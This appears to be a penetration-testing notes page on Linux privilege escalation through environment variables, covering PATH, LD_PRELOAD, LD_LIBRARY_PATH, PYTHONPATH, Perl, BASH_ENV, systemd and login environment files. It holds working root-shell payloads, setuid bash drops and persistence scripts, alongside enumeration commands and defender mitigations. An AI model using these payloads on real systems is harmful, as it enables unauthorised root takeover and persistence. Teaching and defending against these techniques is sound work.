+++
title = 'Environment Variables Abuse'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['linux', 'privilege-escalation', 'environment', 'path-hijack']
+++

Environment variables are the configuration plane that every process inherits. When a privileged process — a root cron job, a systemd unit, a sudo-allowed command — trusts its inherited environment, a low-privileged user can often turn that trust into root. The critical question is always **whether the variable survives into the privileged process**, which depends on `sudo`'s environment handling, the scheduler's reset behaviour, and the binary's own sanitisation.

---

## Why These Attacks Work (and Often Fail)

The single most common reason an environment-variable attack fails is that the privileged process does not actually inherit the attacker's environment:

| Context | Environment behaviour |
|---|---|
| **`sudo`** | `env_reset` (default) strips all variables except a whitelist. Only `env_keep += VAR` or the `SETENV` tag allows a variable through. `secure_path` replaces `PATH` regardless. |
| **Root cron** | Runs with a minimal environment defined in `/etc/crontab` (typically `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`). It does **not** inherit your shell environment. |
| **systemd units** | The service manager starts with a clean environment. Units only receive variables from `Environment=`, `EnvironmentFile=`, and `DefaultEnvironment=`. |
| **SUID binaries** | In secure-execution mode, the dynamic loader **ignores** `LD_PRELOAD` and `LD_LIBRARY_PATH`. |
| **`/etc/environment`** | Read by PAM at login and applied to the session. Writable `/etc/environment` is therefore a cross-user, cross-session injection point. |

> **Rule of thumb:** If the privileged process is `sudo` and `sudo -l` shows neither `env_keep` for the target variable nor `SETENV`, the variable-based path is closed. Look for another vector.

---

## PATH Abuse

> **What is the purpose of the PATH variable?**  
> `$PATH` is an environment variable that **specifies the set of directories where an executable can be located**. It lets a user type `cat /tmp/test.txt` instead of `/bin/cat /tmp/test.txt`. Creating a script or program in a directory listed in `$PATH` makes it executable from any directory.

### Interacting with PATH

```bash
env | grep PATH              # or: echo $PATH
export PATH=/tmp:$PATH       # prepend /tmp
export PATH=.:$PATH          # prepend current directory (implicit dot)
```

### Prerequisites

1. A program or script executed as **root** (cron job, systemd unit, sudo-allowed binary) that calls another command **without an absolute path**.
2. The program must **inherit your `PATH`**. This is usually the failing condition:
   - `sudo` resets `PATH` via `secure_path` in `/etc/sudoers` and drops your environment unless `SETENV`/`env_keep+=PATH` is configured.
   - Root cron jobs have their own `PATH`, defined in `/etc/crontab` or at the top of the script.
   - SUID binaries are expected to sanitise their environment; some do not, but do not count on it.
3. Confirm the precondition:
   ```bash
   sudo -l                          # look for SETENV or env_keep+=PATH
   sudo -l | grep -i "secure_path"
   ```

### Finding hijack targets

```bash
# Identify writable directories already in your PATH
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done

# Find root-executed scripts that call commands by bare name
grep -rn --include="*.sh" -E '^[a-zA-Z]|[;&|]\s*[a-zA-Z]' /etc/cron* /opt /usr/local 2>/dev/null | grep -v '^Binary'

# Find systemd units that do not use an absolute ExecStart path
grep -r "ExecStart=" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -v "ExecStart=/"

# Watch live root process invocations
./pspy64 -pf -i 1000
```

Common writable PATH directories: `/usr/local/bin` writable by the `staff` group, `/tmp` prepended in a cron `PATH`, the current directory (`.`) or an empty entry (`::`) in `PATH`.

### Exploitation

Suppose a root-run program uses `system("ps aux")` instead of `/bin/ps`:

```c
// /tmp/ps.c — payload
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    setuid(0); setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

```bash
gcc -o /tmp/ps /tmp/ps.c
export PATH=/tmp:$PATH
# trigger the vulnerable program
```

The shell resolves `ps` from `/tmp` first and executes your code with the parent's privileges.

**Shell-script payload (simpler, but verify the parent calls `system()` or `execvp`):**

```bash
echo '#!/bin/sh' > /writable/dir/COMMANDNAME
echo 'cp /bin/bash /tmp/.rootbash; chmod u+s /tmp/.rootbash' >> /writable/dir/COMMANDNAME
chmod +x /writable/dir/COMMANDNAME
# after the root job fires:
/tmp/.rootbash -p
```

**Common pitfalls:**

- **Do not hijack shell builtins** (`echo`, `cd`, `test`, `[`, `printf`, `pwd`, `read`, `export`). `system()`/`sh -c` handles them internally and never searches `PATH`. Use an external command (`ps`, `tar`, `cat`, `ls`, `ssh`, `id`).
- **If the root program is SUID and calls `system()`**, bash drops the effective UID — use `system("/bin/bash -p")` or setuid in the C payload.
- **If `sudo` is involved**, `sudo env PATH=/tmp:$PATH /usr/bin/allowed-binary` only works with `SETENV`, and `secure_path` may still win. Check the exact `sudo -l` line first.

> **Warning:** A PATH hijack against a root cron job fails if the script sets `PATH` itself or calls the binary by absolute path. Read the script first; do not assume.

### Confirming execution

Before relying on the payload, plant a marker to verify it ran:

```bash
echo 'touch /tmp/.hijack_proof' >> /writable/dir/COMMANDNAME
# after the next cron interval / service restart:
ls -la /tmp/.hijack_proof
```

---

## LD_PRELOAD Abuse

> **What is the purpose of the LD_PRELOAD variable?**  
> `LD_PRELOAD` is an optional environment variable containing one or more paths to shared libraries/objects. All libraries specified by this variable are loaded (preloaded) **before any other shared library**, and any function in them overrides the system version.

### Prerequisites

- A **dynamically linked ELF binary** executed as root — a cron job, a systemd service, or a sudo-allowed command. A shell script is not an ELF binary: `LD_PRELOAD` has no effect on it, and `ldd /path/to/script` returns "not a dynamic executable."
- The environment must survive into that process:
  - `sudo` strips `LD_PRELOAD` unless `env_keep+=LD_PRELOAD` is configured (check `sudo -l`), or the command is allowed with `SETENV` and you use `sudo -E` / `sudo LD_PRELOAD=...`.
  - A root cron job or systemd service normally does **not** inherit your shell environment, so this technique is mostly a `sudo`-with-`env_keep` path.
- **SUID binaries are not usable**: in secure-execution mode the dynamic loader ignores `LD_PRELOAD` (and `LD_LIBRARY_PATH`) for setuid binaries. `sudo` works because it changes the real and effective UID to root before `execve()`, so the target is not treated as a setuid binary — but only if `LD_PRELOAD` is preserved.

### Enumerating the precondition

```bash
sudo -l
# look for:
#   env_keep += LD_PRELOAD
#   env_keep += LD_LIBRARY_PATH
#   env_keep += PYTHONPATH
#   env_keep += PERL5LIB
#   SETENV on any allowed command

# Also inspect the global defaults:
grep -E "env_keep|env_reset|SETENV|LD_PRELOAD" /etc/sudoers /etc/sudoers.d/* 2>/dev/null
```

If `env_reset` is present without `env_keep` overrides, `LD_PRELOAD` is stripped and this technique does not apply.

### PoC code (constructor — no need to match a function signature)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

The constructor runs **before `main()`**, so you do not need to know which library function the target calls. `unsetenv("LD_PRELOAD")` prevents infinite recursion if the spawned shell also inherits it; `-p` preserves the effective UID.

The classic alternative is to define a function with the same signature as one used by the target (e.g. `getuid`), but a mismatched or missing symbol can prevent the program from starting.

### Steps to reproduce

1. Confirm the target is a dynamically linked binary: `file /path/to/binary` (look for "ELF ... dynamically linked").
2. Confirm `LD_PRELOAD` survives: `sudo -l` shows `env_keep+=LD_PRELOAD`, or `SETENV` on the allowed command.
3. Write the PoC to `/tmp/exploit.c`.
4. Compile: `gcc -fPIC -shared -nostartfiles -o /tmp/exploit.so /tmp/exploit.c`
5. Execute: `sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/<allowed-command>`
6. If sudo reports "sorry, you are not allowed to set the following environment variables", the `env_keep`/`SETENV` prerequisite is not met — stop and look for another vector.

### Verifying the library loads

If no shell spawns, check whether the library is actually loaded:

```bash
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find 2>&1
file /tmp/preload.so       # should show: ELF 64-bit LSB shared object
```

- `cannot open shared object file` → wrong path.
- `invalid ELF header` → compilation failed; check gcc output.

> **Info:** `LD_PRELOAD` is also honoured by `ld.so` when running a binary with `LD_LIBRARY_PATH`-style tricks, but the same secure-execution restriction applies to SUID files. For a hijackable `RUNPATH`/`RPATH`, see the Shared Object Hijacking section in Miscellaneous Techniques.

---

## LD_LIBRARY_PATH Abuse

`LD_LIBRARY_PATH` prepends directories to the **library search path**. If preserved by `sudo`, you can plant a fake version of any shared library the sudo command loads, overriding the system version.

### Enumeration and exploitation

```bash
sudo -l | grep LD_LIBRARY_PATH

# Identify what libraries the allowed sudo binary loads:
sudo -l                                  # find the allowed command
ldd /usr/sbin/apache2                    # e.g. libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
```

Create a malicious version of one of those libraries:

```c
// /tmp/libcrypt.c
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -nostartfiles -o /tmp/libcrypt.so.1 /tmp/libcrypt.c
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

The linker searches `/tmp` first, finds your fake `libcrypt.so.1`, loads it, and the constructor fires as root.

> **Note:** Like `LD_PRELOAD`, this is stripped by `env_reset` and ignored for SUID binaries. It only works with `env_keep+=LD_LIBRARY_PATH` or `SETENV`.

---

## PYTHONPATH Abuse

`PYTHONPATH` tells Python where to look for modules, **prepended to `sys.path`** with higher priority than system paths. If `PYTHONPATH` is in `env_keep` and sudo allows a Python script, you can inject a malicious module that runs as root.

### Enumeration and exploitation

```bash
sudo -l | grep PYTHONPATH
# or SETENV on a python command:
# (root) SETENV: /usr/bin/python3 /opt/scripts/admin_tasks.py
```

```bash
# If the script does `import os`, create a fake os.py
cat > /tmp/os.py << 'EOF'
import subprocess
subprocess.run(["/bin/bash", "-p"])
EOF

sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/scripts/admin_tasks.py
```

> **Note:** If the script imports a module by a name that also exists in the standard library, Python may load the standard module first depending on `sys.path` ordering. Choose a module the script imports that is **not** built-in, or verify by reading the script's imports.

---

## PERL5LIB and PERL5OPT Abuse

Perl's `PERLLIB`, `PERL5LIB`, and `PERL5OPT` environment variables control where modules are loaded from and what options are applied. Historically, `sudo` before 1.6.8p12 failed to clear these when the Perl taint flag was off, allowing an attacker with sudo access to a Perl script to load arbitrary library files.

### Enumeration and exploitation

```bash
sudo -l | grep -E "PERLLIB|PERL5LIB|PERL5OPT"
```

```bash
# If a sudo-allowed Perl script is available and PERL5LIB survives:
mkdir -p /tmp/perlmod
cat > /tmp/perlmod/Evil.pm << 'EOF'
package Evil;
use strict;
use warnings;
BEGIN {
    system("/bin/bash -p");
}
1;
EOF

sudo PERL5LIB=/tmp/perlmod perl /opt/scripts/allowed_script.pl
```

`PERL5OPT` can be even more direct:

```bash
sudo PERL5OPT="-M Evil" PERL5LIB=/tmp/perlmod perl /opt/scripts/allowed_script.pl
```

> **Note:** This is largely a legacy vector (CVE-2005-4158). Modern `sudo` versions with `env_reset` and no `env_keep` for these variables are not vulnerable. Check `sudo -l` and the sudo version before investing time.

---

## BASH_ENV and ENV Abuse

`BASH_ENV` (bash) and `ENV` (POSIX sh) specify an **initialisation file that is sourced at the start of every non-interactive shell**. If an attacker can set these variables, arbitrary commands run at the start of every shell script — affecting system scripts, cron jobs, and any program that spawns a subshell.

### Sudo-preserved BASH_ENV

```bash
sudo -l | grep BASH_ENV
# env_keep += BASH_ENV

cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh

BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo
```

When `sudo` invokes the target (which is a shell script or spawns a shell), bash sources `/dev/shm/shell.sh` before executing the script — and you get a root shell.

### Writable BASH_ENV file

If a root cron job or systemd unit sets `BASH_ENV` to a **writable path**, you can replace its contents:

```bash
grep -r "BASH_ENV" /etc/cron* /etc/systemd/system/ 2>/dev/null
ls -la /path/to/bash_env_file
# if writable:
echo '/bin/bash -p' >> /path/to/bash_env_file
```

> **Note:** `BASH_ENV` is only sourced by **non-interactive** bash shells. A cron job running `/bin/sh script.sh` may not be affected if `/bin/sh` is dash; verify the interpreter.

---

## Systemd Environment Directives

systemd units define their environment through `Environment=`, `EnvironmentFile=`, and `DefaultEnvironment=`. A writable `EnvironmentFile` consumed by a root service is a direct escalation primitive: the next service restart loads your variables.

### Enumeration

```bash
systemctl show <service> | grep -i environment
systemctl cat <service> | grep -E "Environment|EnvironmentFile"
grep -r "EnvironmentFile=" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null
```

### Exploitation

If an `EnvironmentFile` is writable:

```bash
cat /etc/systemd/system/myservice.service
# EnvironmentFile=/etc/conf.d/myservice
ls -la /etc/conf.d/myservice
# if writable:
echo 'LD_PRELOAD=/tmp/evil.so' >> /etc/conf.d/myservice
systemctl daemon-reload
systemctl restart myservice
```

The service now loads your shared library — or, if the unit also inherits a `PATH`, you can inject a directory into `PATH` and plant a malicious binary.

A real-world example is **MDEV-40629**: a MariaDB service loaded a MySQL-writable file as its `EnvironmentFile`, allowing environment injection on restart.

> **Note:** `Environment=` and `EnvironmentFile=` are evaluated at service start, not on every `systemctl daemon-reload`. You need a restart (or a timer-triggered restart) for the payload to take effect.

---

## Writable `/etc/environment` and `/etc/profile.d`

`/etc/environment` is a system-wide environment file sourced at **PAM login**. It applies to every user including root, and to every login method including SSH, `su`, and GUI login. If writable, injecting `LD_PRELOAD`, `PATH`, or `PYTHONPATH` here causes your payload to load the next time root opens a session.

### Enumeration

```bash
ls -la /etc/environment 2>/dev/null
test -w /etc/environment && echo "WRITABLE: /etc/environment"
cat /etc/environment

find /etc/profile.d/ -writable 2>/dev/null
ls -la /etc/profile.d/
```

### Exploitation via LD_PRELOAD

```bash
gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c
echo 'LD_PRELOAD=/tmp/preload.so' >> /etc/environment
```

Wait for root to open a new session or for a privileged service to restart:

```bash
systemctl list-timers | grep -i restart
grep -r "restart\|reload" /etc/cron* 2>/dev/null
# after root logs in or a service restarts:
/tmp/.rootbash -p
```

> **Important:** `LD_PRELOAD` in `/etc/environment` is typically honoured by PAM-launched processes but **ignored by SUID binaries and services launched by systemd** (which resets the environment). It is most effective when root opens an **interactive login session**.

### Exploitation via PATH

```bash
cat /etc/environment | grep PATH
sed -i 's|PATH="|PATH="/tmp:|' /etc/environment
# or append:
echo 'PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"' >> /etc/environment

echo '#!/bin/sh' > /tmp/apt
echo 'cp /bin/bash /tmp/.rootbash; chmod u+s /tmp/.rootbash' >> /tmp/apt
chmod +x /tmp/apt
```

### `/etc/profile.d/` script injection

Scripts in `/etc/profile.d/` are sourced by bash and sh for **every interactive login**. Writing a new script there is equivalent to writing to `/etc/profile` and affects all users.

```bash
find /etc/profile.d/ -writable 2>/dev/null
cat > /etc/profile.d/privesc.sh << 'EOF'
cp /bin/bash /tmp/.rootbash
chmod u+s /tmp/.rootbash
EOF
chmod +x /etc/profile.d/privesc.sh
```

Fires the next time any user (including root via SSH or `su -`) opens an interactive login shell.

> **Note:** `/etc/bash.bashrc` is sourced by interactive **non-login** bash shells; less reliable than `/etc/profile.d/` but worth checking with `ls -la /etc/bash.bashrc`.

---

## Variable-Trust CVEs (2025–2026)

A growing class of vulnerabilities stems from privileged programs trusting environment variables without sanitisation.

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-6018** | `pam_env.so` | An unprivileged user injects `XDG_SEAT` / `XDG_VTNR` via `~/.pam_environment`; `pam_systemd.so` mis-grants console (`allow_active`) privileges. Chains with **CVE-2025-6019** (UDisks2 race) for root. |
| **CVE-2026-53614** | `libmount` in SUID `mount(8)` | `LIBMOUNT_FORCE_MOUNT2=always` plus a crafted `/etc/fstab` bind entry escalates to root. Fixed in util-linux 2.41.5 / 2.42.2. |
| **CVE-2026-100310** | GNU libextractor | `LIBEXTRACTOR_PREFIX` points at an untrusted plugin search path; loadable from a setuid/setgid program. |
| **CVE-2026-28372** | `login(1)` / util-linux | `CREDENTIALS_DIRECTORY` environment variable bypasses authentication. |
| **CVE-2026-24061** | GNU InetUtils telnetd | `USER` environment variable injection (`-f root`) bypasses authentication. |
| **CVE-2026-48980** | `pam_usb` | `XRDP_SESSION`, `DISPLAY`, and `TMUX` are trusted to determine login locality, enabling environment injection. |

### Detection snippets

```bash
# CVE-2025-6018 surface
ls -la ~/.pam_environment 2>/dev/null
grep -r "user_readenv" /etc/pam.d/ 2>/dev/null

# CVE-2026-53614 surface
mount --version
grep -r "LIBMOUNT_FORCE_MOUNT2" /proc/*/environ 2>/dev/null

# libextractor surface
ldd $(which extract) 2>/dev/null | grep libextractor
```

---

## Variable Reference and Quick Triage

| Variable | Effect when trusted | Where it survives |
|---|---|---|
| `PATH` | Command hijacking | `env_keep+=PATH`, `SETENV`, cron `PATH` |
| `LD_PRELOAD` | Shared-library preload | `env_keep+=LD_PRELOAD`, `SETENV` |
| `LD_LIBRARY_PATH` | Library search path | `env_keep+=LD_LIBRARY_PATH`, `SETENV` |
| `PYTHONPATH` | Python module search | `env_keep+=PYTHONPATH`, `SETENV` |
| `PERL5LIB` / `PERL5OPT` | Perl module/option injection | `env_keep` (legacy sudo) |
| `BASH_ENV` / `ENV` | Shell init-file sourcing | `env_keep+=BASH_ENV`, writable env file |
| `IFS` | Word-splitting manipulation | `env_keep+=IFS` (rare) |
| `CREDENTIALS_DIRECTORY` | systemd credential path | Inherited into services |

### Triage one-liners

```bash
# What does sudo preserve?
sudo -l

# Global defaults
grep -E "env_keep|env_reset|SETENV|secure_path" /etc/sudoers /etc/sudoers.d/* 2>/dev/null

# Writable environment files
for f in /etc/environment /etc/profile /etc/bash.bashrc; do [ -w "$f" ] && echo "WRITABLE: $f"; done
find /etc/profile.d/ -writable 2>/dev/null

# Writable systemd EnvironmentFile
systemctl list-units --type=service --all --no-pager | while read -r unit _; do
    envfile=$(systemctl show "$unit" -p EnvironmentFiles 2>/dev/null | cut -d= -f2)
    [ -n "$envfile" ] && [ -w "$envfile" ] && echo "WRITABLE ENVFILE: $unit -> $envfile"
done 2>/dev/null

# Writable directories in PATH
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE PATH: $d"; done
```

---

## Mitigation Notes (Defender Perspective)

- **`sudo`:** keep `env_reset` on; remove `env_keep` entries for `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5LIB`, `BASH_ENV`, and `PATH`; always set `secure_path`; avoid `SETENV` on commands that can spawn a shell.
- **Cron / systemd:** set an explicit, minimal `PATH` at the top of the crontab and in unit files; use absolute paths for every command; never source an environment file from a world- or service-user-writable location.
- **`/etc/environment` and `/etc/profile.d/`:** should be writable only by root; audit with `find /etc/profile.d/ -not -user root`.
- **SUID / capabilities:** prefer capabilities over SUID; in either case, do not rely on the loader to strip dangerous variables for you.

These notes complement the [Capabilities Abuse](#) file: capabilities bypass the need for environment inheritance entirely, and the two should be checked together during enumeration.
